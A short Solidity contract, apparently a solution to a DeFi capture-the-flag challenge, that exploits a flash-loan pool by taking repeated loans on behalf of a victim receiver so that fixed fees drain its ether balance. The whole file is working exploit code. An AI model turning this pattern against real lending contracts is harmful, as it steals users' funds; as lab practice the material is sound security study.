// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title NaiveReceiverLenderPoolExploit
 * @author 0xcyphered 
 */
 
interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
    function fixedFee() external pure returns (uint256);
}

contract FlashLoanExploit {
    constructor(address _pool, address user) {
        IPool pool = IPool(_pool);
        uint256 fixedFee = pool.fixedFee();
        uint256 balance = user.balance;
        uint count = balance / 1 ether;
        for (uint256 index = 0; index < count; index++) {
            pool.flashLoan(user, fixedFee);
        }
    }
}